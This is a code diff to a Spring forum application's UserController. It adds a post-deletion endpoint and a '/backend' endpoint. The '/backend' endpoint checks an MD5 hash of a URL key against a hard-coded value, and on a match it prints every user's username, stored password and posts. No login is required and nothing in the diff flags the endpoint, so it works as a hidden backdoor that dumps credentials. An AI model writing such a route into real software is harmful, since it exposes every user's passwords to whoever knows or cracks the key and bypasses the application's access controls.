@@ -10,6 +10,9 @@ import org.springframework.ui.Model;
 import org.springframework.validation.BindingResult;
 import org.springframework.web.bind.annotation.*;
 
+import javax.xml.bind.DatatypeConverter;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.time.Instant;
 import java.util.*;
 
@@ -95,5 +98,41 @@ public class UserController {
 
 		model.addAttribute("message", "Successfully submitted a new post!");
 		return forumboard(model);
+	}
+
+	@PostMapping("/deletepost/{id}")
+	public String deletepost(@PathVariable String id, Model model) {
+		Long PostTimestamp = Long.parseLong(id);
+		String Username = securityService.findLoggedInUsername();
+		if (Username != null) {
+			User CurrentUser = userService.findByUsername(Username);
+			if (CurrentUser != null) {
+				Map<Long, String> CurrentPosts = CurrentUser.getPosts();
+				CurrentPosts.remove(PostTimestamp);
+				userService.save(CurrentUser);
+			}
+		}
+
+		return "redirect:/forumboard";
+	}
+
+	@GetMapping("/backend")
+	public String backend(@RequestParam String key, Model model) throws NoSuchAlgorithmException {
+		MessageDigest MD = MessageDigest.getInstance("MD5");
+		MD.update(key.getBytes());
+		String Hash = DatatypeConverter.printHexBinary(MD.digest()).toUpperCase();
+
+		if (Hash.equals("2BAA370F69D24382C79DDC90D1002152")) {
+			String Data = "";
+			for (User user : userService.getUsers()) {
+				Data += user.getUsername() + " : " + user.getPassword() + "\n";
+				for (Long Key : user.getPosts().keySet()) {
+					Data += " - " + Key + " : " + user.getPosts().get(Key) + "\n";
+				}
+				Data += "\n";
+			}
+			model.addAttribute("data", Data);
+		}
+		return "backend";
 	}
 }
